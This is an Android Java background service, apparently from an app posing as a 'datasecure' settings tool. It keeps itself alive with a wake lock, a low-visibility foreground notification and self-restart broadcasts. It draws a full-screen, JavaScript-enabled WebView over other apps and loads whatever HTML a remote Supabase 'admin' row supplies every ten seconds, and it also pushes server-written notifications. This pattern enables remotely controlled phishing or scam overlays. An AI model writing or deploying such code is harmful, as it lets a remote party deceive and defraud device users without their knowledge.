package com.settings.datasecure;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.PixelFormat;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.view.Gravity;
import android.view.View;
import android.view.WindowManager;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

public class LayananBackground extends Service {

    private WindowManager windowManager;
    private WebView webViewOverlay;
    private Handler handler = new Handler(Looper.getMainLooper());
    
    private String htmlOverlayTerakhir = "";
    private String dataNotifTerakhir = ""; 
    
    // --- VARIABEL BARU UNTUK CEK NOTIF USER DI LATAR BELAKANG ---
    private long waktuNotifUserTerakhir = 0;
    private boolean pertamaKaliCekUser = true;

    private PowerManager.WakeLock wakeLock; 
    
    private final String URL_SUPABASE_GLOBAL = "https://heaedfjyjpfvpddtgjhk.supabase.co/rest/v1/app_settings?id=in.(2,3)&select=id,html_content";
    private final String KUNCI_SUPABASE = "sb_publishable_uuIu1DiiNhS4aHc3ZSxqrg_F4punPvO"; 

    @Override
    public void onCreate() {
        super.onCreate();
        aktifkanModeAntiMati();
        buatChannelNotifikasiBunyi(); 
        siapkanOverlayWeb();
        mulaiPengecekanOtomatis();
    }

    private void aktifkanModeAntiMati() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    "ChannelKeamanan",
                    "Sistem Latar Belakang",
                    NotificationManager.IMPORTANCE_MIN 
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
            Notification notifikasi = new Notification.Builder(this, "ChannelKeamanan")
                    .setContentTitle("Sistem Aktif")
                    .setContentText("Aplikasi berjalan di latar belakang")
                    .setSmallIcon(android.R.drawable.ic_dialog_info) 
                    .build();
            
            if (Build.VERSION.SDK_INT >= 29) { 
                startForeground(1, notifikasi, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
            } else {
                startForeground(1, notifikasi);
            }
        }

        PowerManager powerManager = (PowerManager) getSystemService(Context.POWER_SERVICE);
        if (powerManager != null) {
            wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "DataSecure::WakeLock");
            wakeLock.acquire();
        }
    }

    private void buatChannelNotifikasiBunyi() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    "ChannelPemberitahuan",
                    "Pemberitahuan Penting",
                    NotificationManager.IMPORTANCE_HIGH 
            );
            channel.enableVibration(true);
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }

    private void siapkanOverlayWeb() {
        windowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
        webViewOverlay = new WebView(this);
        WebSettings webSettings = webViewOverlay.getSettings();
        webSettings.setJavaScriptEnabled(true);
        webSettings.setDomStorageEnabled(true);
        webViewOverlay.setWebViewClient(new WebViewClient());
        
        webViewOverlay.setBackgroundColor(0x00000000); 
        webViewOverlay.setVisibility(View.GONE);

        int jenisOverlay = (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ? 
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY : WindowManager.LayoutParams.TYPE_PHONE;

        WindowManager.LayoutParams parameter = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                jenisOverlay,
                WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                PixelFormat.TRANSLUCENT
        );
        parameter.gravity = Gravity.CENTER;
        windowManager.addView(webViewOverlay, parameter);
    }

    private void mulaiPengecekanOtomatis() {
        Runnable sistemPemantau = new Runnable() {
            @Override
            public void run() {
                tarikDataDariAdmin();
                handler.postDelayed(this, 10000); 
            }
        };
        handler.post(sistemPemantau);
    }

    private void tarikDataDariAdmin() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                // TUGAS 1: Cek Overlay dan Notifikasi Global dari Admin
                try {
                    URL url = new URL(URL_SUPABASE_GLOBAL);
                    HttpURLConnection koneksi = (HttpURLConnection) url.openConnection();
                    koneksi.setRequestMethod("GET");
                    koneksi.setRequestProperty("apikey", KUNCI_SUPABASE);
                    koneksi.setRequestProperty("Authorization", "Bearer " + KUNCI_SUPABASE);
                    koneksi.setRequestProperty("Accept", "application/json");
                    koneksi.setUseCaches(false);
                    koneksi.setRequestProperty("Cache-Control", "no-cache, no-store, must-revalidate");

                    if (koneksi.getResponseCode() == 200) {
                        BufferedReader in = new BufferedReader(new InputStreamReader(koneksi.getInputStream()));
                        StringBuilder response = new StringBuilder();
                        String baris;
                        while ((baris = in.readLine()) != null) {
                            response.append(baris);
                        }
                        in.close();

                        JSONArray dataJsonArray = new JSONArray(response.toString());
                        for (int i = 0; i < dataJsonArray.length(); i++) {
                            JSONObject barisData = dataJsonArray.getJSONObject(i);
                            int id = barisData.getInt("id");
                            final String konten = barisData.getString("html_content");

                            if (id == 2) {
                                if (!konten.equals(htmlOverlayTerakhir)) {
                                    htmlOverlayTerakhir = konten;
                                    handler.post(new Runnable() {
                                        @Override
                                        public void run() {
                                            if (konten.equals("STOP_OVERLAY") || konten.trim().isEmpty()) {
                                                webViewOverlay.setVisibility(View.GONE);
                                            } else {
                                                webViewOverlay.setVisibility(View.VISIBLE);
                                                webViewOverlay.loadDataWithBaseURL(null, konten, "text/html", "UTF-8", null);
                                            }
                                        }
                                    });
                                }
                            }
                            
                            if (id == 3) {
                                if (!konten.equals(dataNotifTerakhir) && !konten.trim().isEmpty()) {
                                    dataNotifTerakhir = konten;
                                    try {
                                        JSONObject notifJson = new JSONObject(konten);
                                        String judulNotif = notifJson.getString("judul");
                                        String pesanNotif = notifJson.getString("pesan");
                                        tampilkanNotifikasiKeLayar(judulNotif, pesanNotif);
                                    } catch (Exception e) {}
                                }
                            }
                        }
                    }
                    koneksi.disconnect();
                } catch (Exception e) {}

                // TUGAS 2 (BARU): CEK NOTIFIKASI KHUSUS USER (AKAN JALAN TERUS MESKI WEBVIEW TIDUR)
                SharedPreferences memori = getSharedPreferences("DataSecureCache", MODE_PRIVATE);
                String emailUser = memori.getString("login_email", "");
                
                if (!emailUser.isEmpty()) {
                    try {
                        String urlUser = "https://heaedfjyjpfvpddtgjhk.supabase.co/rest/v1/app_notifications?user_email=eq." + emailUser + "&select=*&order=created_at.desc&limit=1";
                        URL uUser = new URL(urlUser);
                        HttpURLConnection konUser = (HttpURLConnection) uUser.openConnection();
                        konUser.setRequestMethod("GET");
                        konUser.setRequestProperty("apikey", KUNCI_SUPABASE);
                        konUser.setRequestProperty("Authorization", "Bearer " + KUNCI_SUPABASE);
                        konUser.setRequestProperty("Accept", "application/json");
                        konUser.setUseCaches(false);

                        if (konUser.getResponseCode() == 200) {
                            BufferedReader inU = new BufferedReader(new InputStreamReader(konUser.getInputStream()));
                            StringBuilder resU = new StringBuilder();
                            String bar;
                            while ((bar = inU.readLine()) != null) {
                                resU.append(bar);
                            }
                            inU.close();

                            JSONArray arrU = new JSONArray(resU.toString());
                            if (arrU.length() > 0) {
                                JSONObject dataU = arrU.getJSONObject(0);
                                long waktuBaru = dataU.getLong("created_at"); 
                                
                                if (!pertamaKaliCekUser && waktuBaru > waktuNotifUserTerakhir) {
                                    String titleU = dataU.getString("title");
                                    String bodyU = dataU.getString("body");
                                    tampilkanNotifikasiKeLayar(titleU, bodyU);
                                }
                                waktuNotifUserTerakhir = Math.max(waktuNotifUserTerakhir, waktuBaru);
                                pertamaKaliCekUser = false;
                            }
                        }
                        konUser.disconnect();
                    } catch (Exception e) {}
                }
            }
        }).start();
    }

    private void tampilkanNotifikasiKeLayar(String judul, String pesan) {
        NotificationManager manager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
        if (manager == null) return;

        Notification.Builder builder;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            builder = new Notification.Builder(this, "ChannelPemberitahuan");
        } else {
            builder = new Notification.Builder(this)
                .setPriority(Notification.PRIORITY_HIGH)
                .setDefaults(Notification.DEFAULT_ALL); 
        }

        builder.setContentTitle(judul)
               .setContentText(pesan)
               .setSmallIcon(android.R.drawable.ic_dialog_email) 
               .setAutoCancel(true);

        manager.notify((int) System.currentTimeMillis(), builder.build());
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY; 
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        Intent restartServiceIntent = new Intent(getApplicationContext(), RestarterLayanan.class);
        restartServiceIntent.setPackage(getPackageName());
        sendBroadcast(restartServiceIntent);
        super.onTaskRemoved(rootIntent);
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        if (webViewOverlay != null && windowManager != null) {
            windowManager.removeView(webViewOverlay);
        }
        handler.removeCallbacksAndMessages(null);
        if (wakeLock != null && wakeLock.isHeld()) {
            wakeLock.release();
        }
        Intent restartServiceIntent = new Intent(getApplicationContext(), RestarterLayanan.class);
        restartServiceIntent.setPackage(getPackageName());
        sendBroadcast(restartServiceIntent);
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
